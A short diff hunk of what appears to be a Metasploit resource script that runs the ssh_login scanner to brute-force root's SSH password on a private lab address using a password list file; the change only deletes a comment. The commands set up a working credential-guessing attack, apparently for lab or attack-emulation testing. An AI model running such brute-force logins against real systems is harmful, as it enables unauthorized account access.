@@ -6,7 +6,6 @@ use auxiliary/scanner/ssh/ssh_login
 set RHOSTS 192.168.56.181
 set RPORT 22
 set USERNAME root
-# change PASS_FILE with unix_passwords_modified file path
 set PASS_FILE /home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt
 run
 
